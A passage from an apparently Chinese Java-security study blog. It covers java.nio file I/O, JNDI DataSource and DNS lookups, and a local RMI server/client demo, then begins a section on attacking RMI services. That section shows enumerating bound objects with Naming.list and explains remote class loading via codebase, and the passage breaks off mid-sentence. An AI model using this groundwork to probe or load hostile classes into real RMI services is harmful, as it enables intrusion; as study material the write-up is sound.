href="#FileSystemProvider" class="headerlink" title="FileSystemProvider"></a>FileSystemProvider</h2><p>读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><span class="hljs-comment">//File file = new File(&quot;D:/1.txt&quot;);//Files.readAllBytes()需要传进path</span><br>        Path path = Paths.get(<span class="hljs-string">&quot;D:/1.txt&quot;</span>);<br>        <span class="hljs-comment">//或者可以file定义文件，然后toPath返回路径</span><br>        <span class="hljs-comment">//Path path1=file.toPath();</span><br>        <span class="hljs-keyword">byte</span>[] bytes = Files.readAllBytes(path);<br>        <span class="hljs-comment">//byte[] bytes1 = Files.readAllBytes(path1);</span><br>        System.out.println(<span class="hljs-keyword">new</span> String(bytes));<br>        <span class="hljs-comment">//System.out.println(new String(bytes1));</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Path path = Paths.get(<span class="hljs-string">&quot;D:/2.txt&quot;</span>);<br>        String text = <span class="hljs-string">&quot;final&quot;</span>;<br>        Files.write(path,text.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI&amp;RMI&amp;LDAP</title>
    <link href="/2023/03/15/JNDI&amp;RMI&amp;LDAP/"/>
    <url>/2023/03/15/JNDI&amp;RMI&amp;LDAP/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI-amp-RMI-amp-LDAP"><a href="#JNDI-amp-RMI-amp-LDAP" class="headerlink" title="JNDI&amp;RMI&amp;LDAP"></a>JNDI&amp;RMI&amp;LDAP</h1><p><code>JNDI</code>是<code>Java Naming and Directory Interface</code>即 Java 命名与目录接口，通过 JNDI 的 API 可以调用目录或服务有：<code>JDBC LDAP RMI DNS NIS CORBA</code>，<code>JNDI</code>是<code>Java EE</code>的重要组成部分</p><p>其中的<code>Naming</code>用以命名唯一资源，从而资源方便被调用；<code>Directory</code>就是目录服务，与计算机的文件系统很像(dns 也是一种目录服务)</p><h2 id="DataSource"><a href="#DataSource" class="headerlink" title="DataSource"></a>DataSource</h2><p><a href="https://www.jianshu.com/p/336803c5ce06">参考</a></p><p>往常连接数据库的时候，都是使用原生的 JDBC 的<code>DriverManager</code>，而在生产环境中一般是使用数据源来代替<code>DriverManager</code>管理数据库的连接</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220728043012202.png"></p><p>使用数据源，可以通过池的机制复用数据库的连接，并发对数据库的访问；而另一个场景，不止使用一种数据源，就可以发布不同数据源进行隔离；不同的数据源实现由具体的厂商提供；提供数据源服务的多是<code>Servlet容器</code></p><p>一个 mysql 的配置文件示例如图，数据源名称就是 MySqlDS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">datasources</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">local-tx-datasource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jndi-name</span>&gt;</span>MySqlDS<span class="hljs-tag">&lt;/<span class="hljs-name">jndi-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">connection-url</span>&gt;</span>jdbc:mysql://localhost:3306/lw<span class="hljs-tag">&lt;/<span class="hljs-name">connection-url</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">driver-class</span>&gt;</span>com.mysql.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">driver-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user-name</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">user-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>rootpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exception-sorter-class-name</span>&gt;</span>org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter<span class="hljs-tag">&lt;/<span class="hljs-name">exception-sorter-class-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">metadata</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">type-mapping</span>&gt;</span>mySQL<span class="hljs-tag">&lt;/<span class="hljs-name">type-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">metadata</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">local-tx-datasource</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datasources</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在使用时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Context ctx=<span class="hljs-keyword">new</span> InitialContext();<br>Object datasourceRef=ctx.lookup(<span class="hljs-string">&quot;java:MySqlDS&quot;</span>); <span class="hljs-comment">//引用数据源</span><br>DataSource ds=(Datasource)datasourceRef;<br>conn=ds.getConnection();<br><span class="hljs-comment">/* 使用conn进行数据库SQL操作 */</span><br>......<br>c.close();<br></code></pre></td></tr></table></figure><p>通过 JNDI 统一的接口，只需要配置好数据源，在使用时，只需要调用 lookup 方法，查询数据源名称就可以获得数据源，使用数据库，不需要考虑不同数据库的驱动、连接、调用等方式，如果想换一个数据库，只需要修改下数据源配置文件就可以了</p><h2 id="JNDI-调用-DNS-解析"><a href="#JNDI-调用-DNS-解析" class="headerlink" title="JNDI 调用 DNS 解析"></a>JNDI 调用 DNS 解析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.directory.Attributes;<br><span class="hljs-keyword">import</span> javax.naming.directory.DirContext;<br><span class="hljs-keyword">import</span> javax.naming.directory.InitialDirContext;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jndi2DNS</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//设置泛型环境变量，环境需要压入JNDI的工厂类：naming初始化对应JNDI的DNS工厂类(设定DNS Service Provider)，两个参数都是String型，故泛型应该如下</span><br>            Hashtable&lt;String, String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;();<br>            env.put(<span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>,<span class="hljs-string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);<br>            <span class="hljs-comment">//创建JNDI目录服务对象</span><br>            DirContext dnscontext =<span class="hljs-keyword">new</span> InitialDirContext(env);<br>            <span class="hljs-comment">//设置查询类型</span><br>            <span class="hljs-comment">//String[] types = new String[]&#123;&quot;A&quot;&#125;;</span><br>            String[] types = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;TXT&quot;</span>,<span class="hljs-string">&quot;MX&quot;</span>&#125;;<br>            <span class="hljs-comment">//返回查询结果：baidu.com的TXT和MX记录</span><br>            Attributes attrs = dnscontext.getAttributes(<span class="hljs-string">&quot;baidu.com&quot;</span>, types);<br>            System.out.println(attrs);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#&#123;a=A: 110.242.68.66, 39.156.66.10&#125;</span><br><br>λ nslookup baidu.com<br>服务器:  ns.yc<br>Address:  10.44.0.2<br><br>非权威应答:<br>名称:    baidu.com<br>Addresses:  110.242.68.66<br>          39.156.66.10<br></code></pre></td></tr></table></figure><p>更为高级的操作有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.what21.demo04;<br><br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> javax.naming.NamingEnumeration;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.directory.Attribute;<br><span class="hljs-keyword">import</span> javax.naming.directory.Attributes;<br><span class="hljs-keyword">import</span> javax.naming.directory.InitialDirContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DNSDemo</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> dnsURL</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NamingException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InitialDirContext <span class="hljs-title">createContext</span><span class="hljs-params">(String dnsURL)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> NamingException</span>&#123;<br>        Hashtable&lt;String,String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;String,String&gt;();<br>        env.put(<span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>, <span class="hljs-string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);<br>        env.put(<span class="hljs-string">&quot;java.naming.provider.url&quot;</span>,dnsURL);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> InitialDirContext(env);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> address</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NamingException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search</span><span class="hljs-params">(InitialDirContext context,String address)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> NamingException</span>&#123;<br>        Attributes attrs = context.getAttributes(address, <span class="hljs-keyword">null</span>);<br>        NamingEnumeration eEnum = attrs.getAll();<br>        <span class="hljs-keyword">while</span>(eEnum.hasMoreElements())&#123;<br>            Attribute attr = (Attribute)eEnum.nextElement();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;attr.size();i++)&#123;<br>                System.out.println(attr.get(i));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> address</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NamingException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search2</span><span class="hljs-params">(InitialDirContext context, String address)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>        String dns_attrs[] = &#123; <span class="hljs-string">&quot;MX&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;HINFO&quot;</span> &#125;;<br>        Attributes attrs = context.getAttributes(address, dns_attrs);<br>        Attribute Aattr = attrs.get(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span>(Aattr!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; Aattr.size(); i++) &#123;<br>                System.out.println(Aattr.getID()+ <span class="hljs-string">&quot;  &quot;</span> + Aattr.get(i));<br>            &#125;<br>        &#125;<br><br>        Attribute MXattr = attrs.get(<span class="hljs-string">&quot;MX&quot;</span>);<br>        <span class="hljs-keyword">if</span>(MXattr!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; MXattr.size(); i++) &#123;<br>                System.out.println(MXattr.getID()+ <span class="hljs-string">&quot;  &quot;</span> + MXattr.get(i));<br>            &#125;<br>        &#125;<br><br>        Attribute HINFOattr = attrs.get(<span class="hljs-string">&quot;HINFO&quot;</span>);<br>        <span class="hljs-keyword">if</span>(HINFOattr!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; HINFOattr.size(); i++) &#123;<br>                System.out.println(HINFOattr.getID()+ <span class="hljs-string">&quot;  &quot;</span> + HINFOattr.get(i));<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> args</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        InitialDirContext context = createContext(<span class="hljs-string">&quot;dns://gjjline.bta.net.cn/&quot;</span>);<br>        String nameInSpace = context.getNameInNamespace();<br>        System.out.println(nameInSpace);<br><br>        search(context,<span class="hljs-string">&quot;mail.163.com&quot;</span>);<br>        search2(context,<span class="hljs-string">&quot;mail.163.com&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI(Remote Method Invocation)，Java 远程方法调用，用以构建分布式应用程序，实现了 Java 程序跨 JVM 的远程通信；这种 Java 对象在远程 JVM 调用的实现来源于 Java 的 RPC 思想(Remote Procedure Call)；JRMP(Java Remote Method Protocol，专门为 RMI 设计的协议)和 IIOP(Internet inter-ORB Protocol，基于 CORBA 实现的跨语言协议)可以实现 RMI 通信</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/bfd78d812a584b589c775cb12d938fa2.png"></p><p>流程为：注册服务-&gt;RMIServer-&gt;Client-&gt;接口-&gt;实现接口的功能类</p><p>常见的 RPC 框架</p><ul><li>应用级的服务框架：阿里的 Dubbo/Dubbox、Google gRPC、Spring Boot/Spring Cloud</li><li>远程通信协议：RMI、Socket、SOAP(HTTP XML)、REST(HTTP JSON)</li><li>通信框架：MINA 和 Netty</li></ul><p>实现 Demo：</p><p>信息记录类，含 getter()、setter()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String username;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(String email)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">RMIInterfaceDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>&#123;<br>    <span class="hljs-function">DeserializeTest <span class="hljs-title">getInfo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个服务端，Registry 与 Server 绑定在了一起：main()中可以直接启动该服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RmitestService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RMIInterfaceDemo</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">RmitestService</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException</span>&#123;&#125;;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> DeserializeTest <span class="hljs-title">getInfo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        DeserializeTest aman = <span class="hljs-keyword">new</span> DeserializeTest();<br>        aman.setEmail(<span class="hljs-string">&quot;RMI@gmail.com&quot;</span>);<br>        aman.setUsername(<span class="hljs-string">&quot;RMIWorker&quot;</span>);<br>        <span class="hljs-keyword">return</span> aman;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            RmitestService rmitestService = <span class="hljs-keyword">new</span> RmitestService();<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RmitestService&quot;</span>,rmitestService);<br>            System.out.println(<span class="hljs-string">&quot;Service rmitest has up:&quot;</span>+<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RmitestService&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException | MalformedURLException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RmitestClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">//            RmitestService rmitestService = (RmitestService) Naming.lookup(&quot;rmi://127.0.0.1:1389/RmitestService&quot;);//这里不应该得到rmi对象交给信息类，应该给接口</span><br>            RMIInterfaceDemo rmiInterfaceDemo = (RMIInterfaceDemo) Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RmitestService&quot;</span>);<br>            DeserializeTest info = rmiInterfaceDemo.getInfo();<br>            System.out.println(<span class="hljs-string">&quot;whoami:&quot;</span>+info.getUsername()+<span class="hljs-string">&quot;\n&quot;</span>+<span class="hljs-string">&quot;email:&quot;</span>+info.getEmail());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>拆开来看，就会对这个机制有更深的理解：服务端是绑定了本地的一个类实例，而客户端在调用这个服务端的 RMI 服务时，则需要这个远程服务端类实例的接口，这个接口客户端也是拥有的，但是并不知道这个接口在服务端的实现代码，这没有什么影响</p><p>往往一个 RMI Server 有实现<code>java.rmi.Remote</code>的接口(定义了一些方法)，实现接口的类，一个主类用以注册绑定到 rmi 地址(<strong>这个就是 Server 了，demo 里没有分开 2 和 3</strong>)</p><h3 id="攻击-RMI-服务"><a href="#攻击-RMI-服务" class="headerlink" title="攻击 RMI 服务"></a>攻击 RMI 服务</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220729063335264.png"></p><h4 id="探测-RMI-服务"><a href="#探测-RMI-服务" class="headerlink" title="探测 RMI 服务"></a>探测 RMI 服务</h4><p><code>Naming.rebind()</code>服务端绑定的对象引用客户端都是可以获取的<code>Naming.list()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] names = Naming.list(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/&quot;</span>);<br>System.out.println(Arrays.toString(names));<br></code></pre></td></tr></table></figure><p>得到对象引用，如何<code>lookup()</code>是关键，也就是对其方法进行调用</p><p>调用一个存在危险功能的 RMI 服务端：RMI 绑定对象+方法+参数，找不到它的方法和参数基本没有利用的可能，比较鸡肋</p><h4 id="codebase"><a href="#codebase" class="headerlink" title="codebase"></a>codebase</h4><p>相对于本地路径<code>ClASSPATH</code>，<code>codebase</code>远程类的指定与 jdbc 的 url 相似，通常是远程 URL，比如 http、ftp 等；如果我们指定<code>codebase=http://example.com/ </code>，然后加载<code>org.vulhub.example.Example</code>类，则 Java 虚拟机会下载这个文件<code>http://example.com/org/vulhub/example/Example.class</code>，并作为 Example 类的字节码</p><p>RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的 